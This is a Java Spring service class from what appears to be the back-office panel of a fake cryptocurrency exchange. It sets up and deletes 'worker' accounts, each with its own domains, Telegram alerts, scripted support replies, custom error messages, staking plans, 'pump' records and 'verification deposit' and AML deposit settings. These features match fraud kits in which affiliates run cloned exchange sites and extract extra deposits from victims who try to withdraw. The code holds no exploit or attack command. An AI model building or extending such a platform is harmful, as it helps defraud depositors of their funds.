package me.yukitale.cryptoexchange.panel.worker.service;

import me.yukitale.cryptoexchange.exchange.model.user.User;
import me.yukitale.cryptoexchange.exchange.model.user.UserRole;
import me.yukitale.cryptoexchange.exchange.model.user.UserRoleType;
import me.yukitale.cryptoexchange.exchange.repository.user.RoleRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.UserDepositRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.UserRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserRequiredDepositCoinRepository;
import me.yukitale.cryptoexchange.exchange.security.service.UserDetailsServiceImpl;
import me.yukitale.cryptoexchange.exchange.service.UserService;
import me.yukitale.cryptoexchange.panel.admin.model.coins.AdminCoinSettings;
import me.yukitale.cryptoexchange.panel.admin.model.coins.AdminDepositCoin;
import me.yukitale.cryptoexchange.panel.admin.model.other.*;
import me.yukitale.cryptoexchange.panel.admin.repository.coins.AdminCoinSettingsRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.coins.AdminDepositCoinRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.other.*;
import me.yukitale.cryptoexchange.panel.worker.model.Worker;
import me.yukitale.cryptoexchange.panel.worker.model.settings.coins.WorkerDepositCoin;
import me.yukitale.cryptoexchange.panel.worker.model.settings.other.*;
import me.yukitale.cryptoexchange.panel.worker.repository.*;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WithdrawCoinLimitRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WorkerCoinSettingsRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WorkerDepositCoinRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.other.*;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.Authentication;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

@Service
public class WorkerService {

    @Autowired
    private RoleRepository roleRepository;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private DomainRepository domainRepository;

    @Autowired
    private FastPumpRepository fastPumpRepository;

    @Autowired
    private PromocodeRepository promocodeRepository;

    @Autowired
    private StablePumpRepository stablePumpRepository;

    @Autowired
    private AdminSettingsRepository adminSettingsRepository;

    @Autowired
    private AdminFeatureRepository adminFeatureRepository;

    @Autowired
    private AdminLegalSettingsRepository adminLegalSettingsRepository;

    @Autowired
    private AdminStakingPlanRepository adminStakingPlanRepository;

    @Autowired
    private AdminSupportPresetRepository adminSupportPresetRepository;

    @Autowired
    private AdminErrorMessageRepository adminErrorMessageRepository;

    @Autowired
    private AdminDepositCoinRepository adminDepositCoinRepository;

    @Autowired
    private AdminCoinSettingsRepository adminCoinSettingsRepository;

    @Autowired
    private WorkerSettingsRepository workerSettingsRepository;

    @Autowired
    private WorkerErrorMessageRepository workerErrorMessageRepository;

    @Autowired
    private WorkerFeatureRepository workerFeatureRepository;

    @Autowired
    private WorkerStakingPlanRepository workerStakingPlanRepository;

    @Autowired
    private WorkerSupportPresetsRepository workerSupportPresetsRepository;

    @Autowired
    private WorkerTelegramNotificationRepository workerTelegramNotificationRepository;

    @Autowired
    private WorkerDepositCoinRepository workerDepositCoinRepository;

    @Autowired
    private WorkerCoinSettingsRepository workerCoinSettingsRepository;

    @Autowired
    private WithdrawCoinLimitRepository withdrawCoinLimitRepository;

    @Autowired
    private UserRequiredDepositCoinRepository userRequiredDepositCoinRepository;

    @Autowired
    private UserDepositRepository userDepositRepository;

    @Autowired
    private UserService userService;

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    public Worker getWorker(Authentication authentication) {
        User user = userService.getUser(authentication);
        if (user == null) {
            throw new NullPointerException("User is null");
        }

        return getWorker(user);
    }

    public Worker getWorker(User user) {
        return workerRepository.findByUserId(user.getId()).orElseThrow(NullPointerException::new);
    }

    @Transactional
    public Worker createWorker(User user) {
        Set<UserRole> userRoles = new HashSet<>();
        userRoles.add(roleRepository.findByName(UserRoleType.ROLE_USER).orElseThrow());
        userRoles.add(roleRepository.findByName(UserRoleType.ROLE_WORKER).orElseThrow());

        user.setUserRoles(userRoles);
        user.setRoleType(UserRoleType.ROLE_WORKER.ordinal());

        userRepository.save(user);

        userDetailsService.removeCache(user.getEmail());

        Worker worker = new Worker();
        worker.setSupportOwn(true);
        worker.setUser(user);

        workerRepository.save(worker);

        AdminSettings adminSettings = adminSettingsRepository.findFirst();

        WorkerSettings settings = new WorkerSettings();
        settings.setWorker(worker);
        settings.setSupportWelcomeEnabled(adminSettings.isSupportWelcomeEnabled());
        settings.setSupportWelcomeMessage(adminSettings.getSupportWelcomeMessage());
        settings.setSupportPresetsEnabled(adminSettings.isSupportPresetsEnabled());
        settings.setPromoFormEnabled(true);
        settings.setPromoHideEnabled(false);
        settings.setShowAddressAlways(adminSettings.isShowAddressAlways());
        settings.setShowQrAlways(adminSettings.isShowQrAlways());
        settings.setKycAcceptTimer(adminSettings.getKycAcceptTimer());
        workerSettingsRepository.save(settings);

        AdminLegalSettings adminLegalSettings = adminLegalSettingsRepository.findFirst();

        List<AdminFeature> adminFeatures = adminFeatureRepository.findAll();

        List<WorkerFeature> workerFeatures = new ArrayList<>();
        for (AdminFeature adminFeature : adminFeatures) {
            WorkerFeature feature = new WorkerFeature();
            feature.setWorker(worker);
            feature.setType(adminFeature.getType());
            feature.setEnabled(adminFeature.isEnabled());
            workerFeatureRepository.save(feature);

            workerFeatures.add(feature);
        }

        List<AdminErrorMessage> adminErrorMessages = adminErrorMessageRepository.findAll();

        for (AdminErrorMessage adminErrorMessage : adminErrorMessages) {
            WorkerErrorMessage errorMessage = new WorkerErrorMessage();
            errorMessage.setWorker(worker);
            errorMessage.setType(adminErrorMessage.getType());
            errorMessage.setMessage(adminErrorMessage.getMessage());
            workerErrorMessageRepository.save(errorMessage);
        }

        List<AdminStakingPlan> adminStakingPlans = adminStakingPlanRepository.findAll();

        for (AdminStakingPlan adminStakingPlan : adminStakingPlans) {
            WorkerStakingPlan stakingPlan = new WorkerStakingPlan();
            stakingPlan.setWorker(worker);
            stakingPlan.setTitle(adminStakingPlan.getTitle());
            stakingPlan.setDays(adminStakingPlan.getDays());
            stakingPlan.setPercent(adminStakingPlan.getPercent());
            workerStakingPlanRepository.save(stakingPlan);
        }

        for (WorkerTelegramNotification.Type type : WorkerTelegramNotification.Type.values()) {
            WorkerTelegramNotification telegramNotification = new WorkerTelegramNotification();
            telegramNotification.setWorker(worker);
            telegramNotification.setType(type);
            telegramNotification.setEnabled(true);
            workerTelegramNotificationRepository.save(telegramNotification);
        }

        List<AdminDepositCoin> adminDepositCoins = adminDepositCoinRepository.findAll();

        for (AdminDepositCoin adminDepositCoin : adminDepositCoins) {
            WorkerDepositCoin workerDepositCoin = new WorkerDepositCoin();
            workerDepositCoin.setType(adminDepositCoin.getType());
            workerDepositCoin.setIcon(adminDepositCoin.getIcon());
            workerDepositCoin.setTitle(adminDepositCoin.getTitle());
            workerDepositCoin.setSymbol(adminDepositCoin.getSymbol());
            workerDepositCoin.setMinReceiveAmount(adminDepositCoin.getMinReceiveAmount());
            workerDepositCoin.setMinDepositAmount(adminDepositCoin.getMinDepositAmount());
            workerDepositCoin.setVerifDepositAmount(adminDepositCoin.getVerifDepositAmount());
            workerDepositCoin.setEnabled(adminDepositCoin.isEnabled());
            workerDepositCoin.setWorker(worker);
            workerDepositCoinRepository.save(workerDepositCoin);
        }

        List<AdminSupportPreset> adminSupportPresets = adminSupportPresetRepository.findAll();
        for (AdminSupportPreset adminSupportPreset : adminSupportPresets) {
            WorkerSupportPreset workerSupportPreset = new WorkerSupportPreset();
            workerSupportPreset.setTitle(adminSupportPreset.getTitle());
            workerSupportPreset.setMessage(adminSupportPreset.getMessage());
            workerSupportPreset.setWorker(worker);

            workerSupportPresetsRepository.save(workerSupportPreset);
        }

        AdminCoinSettings adminCoinSettings = adminCoinSettingsRepository.findFirst();

        WorkerCoinSettings workerCoinSettings = new WorkerCoinSettings();
        workerCoinSettings.setMinVerifAmount(adminCoinSettings.getMinVerifAmount());
        workerCoinSettings.setMinDepositAmount(adminCoinSettings.getMinDepositAmount());
        workerCoinSettings.setMinWithdrawAmount(adminCoinSettings.getMinWithdrawAmount());
        workerCoinSettings.setVerifRequirement(adminCoinSettings.isVerifRequirement());
        workerCoinSettings.setDepositCommission(adminCoinSettings.getDepositCommission());
        workerCoinSettings.setWithdrawCommission(adminCoinSettings.getWithdrawCommission());
        workerCoinSettings.setVerifAml(adminCoinSettings.isVerifAml());
        workerCoinSettings.setWorker(worker);
        workerCoinSettingsRepository.save(workerCoinSettings);

        userService.bindToWorker0(user, worker, workerCoinSettings, workerFeatures);

        return worker;
    }

    @Transactional
    public void deleteWorker(Worker worker) {
        User user = worker.getUser();

        Set<UserRole> userRoles = new HashSet<>();
        userRoles.add(roleRepository.findByName(UserRoleType.ROLE_USER).orElseThrow());

        user.setUserRoles(userRoles);
        user.setRoleType(UserRoleType.ROLE_USER.ordinal());

        userRepository.save(user);

        userDetailsService.removeCache(user.getEmail());

        userDepositRepository.removeWorkerForAll(worker.getId());

        userRequiredDepositCoinRepository.deleteAllByDepositCoinWorkerId(worker.getId());

        withdrawCoinLimitRepository.deleteAllByWorkerId(worker.getId());
        workerCoinSettingsRepository.deleteAllByWorkerId(worker.getId());
        workerDepositCoinRepository.deleteAllByWorkerId(worker.getId());

        workerErrorMessageRepository.deleteAllByWorkerId(worker.getId());
        workerFeatureRepository.deleteAllByWorkerId(worker.getId());
        workerSettingsRepository.deleteByWorkerId(worker.getId());
        workerStakingPlanRepository.deleteAllByWorkerId(worker.getId());
        workerTelegramNotificationRepository.deleteAllByWorkerId(worker.getId());
        workerSupportPresetsRepository.deleteAllByWorkerId(worker.getId());

        domainRepository.deleteAllByWorkerId(worker.getId());
        fastPumpRepository.deleteAllByWorkerId(worker.getId());
        stablePumpRepository.deleteAllByWorkerId(worker.getId());
        promocodeRepository.deleteAllByWorkerId(worker.getId());

        userRepository.removeWorkerFromUsers(worker.getId());

        workerRepository.deleteById(worker.getId());

        //todo: delete from all repositories
    }

    public Worker getWorkerByDomain(String domain) {
        return domainRepository.findWorkerByName(domain.toLowerCase()).orElse(null);
    }
}
